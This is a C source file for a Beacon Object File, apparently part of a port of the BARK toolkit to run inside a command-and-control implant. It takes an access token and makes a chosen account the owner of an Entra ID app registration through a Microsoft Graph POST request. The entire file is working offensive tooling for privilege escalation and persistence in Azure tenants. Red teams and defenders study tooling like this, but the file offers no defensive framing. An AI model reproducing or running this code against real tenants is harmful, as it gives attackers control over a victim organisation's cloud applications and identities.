/*
 * new_entra_app_owner.c — BARK BOF
 * New-EntraAppOwner — Add an owner to an app registration
 *
 * Args : token, appObjectId, ownerObjectId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[512], bodyBuf[512];
    LPWSTR widePath = NULL;
    char  *token = NULL, *appId = NULL, *ownerId = NULL;

    BeaconDataParse(&parser, args, alen);
    token   = BeaconDataExtract(&parser, NULL);
    appId   = BeaconDataExtract(&parser, NULL);
    ownerId = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_new_entra_app_owner <token> <appId> <ownerObjectId>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"@odata.id\":\"https://graph.microsoft.com/v1.0/directoryObjects/%s\"}", ownerId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/v1.0/applications/%s/owners/$ref", appId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-EntraAppOwner\n");
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
